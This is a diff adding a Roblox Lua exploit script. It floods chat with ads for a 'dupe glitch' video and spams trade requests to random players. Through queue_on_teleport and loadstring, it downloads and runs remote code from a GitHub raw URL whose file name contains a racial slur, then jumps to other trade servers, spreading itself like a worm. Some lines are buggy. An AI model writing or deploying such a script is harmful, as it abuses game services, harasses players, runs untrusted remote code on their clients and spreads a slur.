@@ -1,0 +1,84 @@
+local ReplicatedStorageService = game:GetService("ReplicatedStorage")
+local args = {
+	"Insane new dupe glitch --> MTSeb jailbreak dupe glitch on ytb"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("SetTradeDesireRemote"):FireServer(unpack(args))
+
+
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+
+local PlayersService = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+
+local LocalPlayer = PlayersService.LocalPlayer
+
+local defaults = LocalPlayer.Character.PrimaryPart.Position
+
+local TextChatService = game:GetService("TextChatService")
+
+task.spawn(function()
+	repeat
+		task.wait(8)
+		
+		pcall(function()
+			local messagevar = {
+				"Crazy new dupe glitch --> MTSeb jailbreak dupe glitch",
+				"Insane dupe glitch just dropped --> MTSeb jailbreak dupe glitch",
+				"New insane dupe glitch --> MTSeb jailbreak dupe glitch",
+				"Wild new dupe glitch --> MTSeb jailbreak dupe glitch",
+				"Insane brand new dupe glitch --> MTSeb jailbreak dupe glitch",
+				"Massive dupe glitch just found --> MTSeb jailbreak dupe glitch",
+				"Insane dupe glitch alert --> MTSeb jailbreak dupe glitch",
+				"New crazy dupe glitch --> MTSeb jailbreak dupe glitch",
+				"Insane dupe glitch revealed --> MTSeb jailbreak dupe glitch",
+				"Latest insane dupe glitch --> MTSeb jailbreak dupe glitch"
+			}
+
+			TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(messagevar[math.random(0, 10)])
+		end)
+
+	until not game
+end)
+
+task.spawn(function()
+	repeat
+		task.wait(0.2)
+
+		pcall(function()
+			local args = {
+				game:GetService("Players"):GetPlayers()[math.random(0, #game:GetService("Players"):GetPlayers())].UserId
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("TradeSendInitiation"):FireServer(unpack(args))
+		end)
+
+	until not game
+end)
+
+task.wait(function()
+	task.wait(60)
+	
+	ReplicatedStorageService.OtherTradeServerData.OnClientEvent:Connect(function(Servers)
+		local TotalServers = 0
+		local TotalTraders = 0
+		local AllServerIDs = {}
+
+		-- Count servers and traders
+		for i, v in next, Servers do
+			local ServerID = v.otherServerId
+			local IDs = v.userIds
+
+			TotalServers = TotalServers + 1
+			TotalTraders = TotalTraders + #IDs
+
+			table.insert(AllServerIDs, ServerID)
+		end
+		
+		queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/nigga1'))()")
+
+		local args = {
+			tostring(AllServerIDs[math.random(1, #AllServerIDs)])
+		}
+		game:GetService("ReplicatedStorage"):WaitForChild("TradeJoinOtherTradeServer"):FireServer(unpack(args))
+	end)
+end)
